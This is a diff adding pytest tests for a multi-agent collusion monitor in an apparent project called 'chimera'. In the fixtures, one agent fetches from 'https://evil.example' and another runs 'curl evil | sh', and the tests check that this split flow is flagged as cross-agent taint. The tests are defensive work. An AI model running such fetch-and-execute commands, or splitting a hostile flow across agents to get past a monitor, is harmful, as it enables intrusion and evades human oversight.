@@ -65,6 +65,36 @@ def test_fan_out_volume_under_budget_is_clean() -> None:
     assert not any(f.kind == "fan-out-volume" for f in findings)
 
 
+def test_report_collusion_wiring_flags_cross_agent(capsys: object) -> None:
+    """The CLI helper that wires per-worker ledgers into the monitor surfaces a split flow."""
+    from chimera.cli.main import _report_collusion
+
+    a = TaintLedger()
+    a.record_fetch("https://evil.example", content="payload")
+    b = TaintLedger()
+    b.record_exec("curl evil | sh")
+    _report_collusion({"A": a, "B": b})
+    out = capsys.readouterr().out  # type: ignore[attr-defined]
+    assert "cross-agent monitor" in out and "cross-agent-taint" in out
+
+
+def test_report_collusion_wiring_clean_run(capsys: object) -> None:
+    from chimera.cli.main import _report_collusion
+
+    a = TaintLedger()
+    a.record_read("notes.txt")
+    _report_collusion({"A": a})
+    out = capsys.readouterr().out  # type: ignore[attr-defined]
+    assert "no collusion signals" in out
+
+
+def test_report_collusion_no_ledgers_is_silent(capsys: object) -> None:
+    from chimera.cli.main import _report_collusion
+
+    _report_collusion({})
+    assert capsys.readouterr().out == ""  # type: ignore[attr-defined]
+
+
 def test_executable_write_counts_as_a_sink() -> None:
     a = TaintLedger()
     a.record_fetch("https://evil.example", content="x")
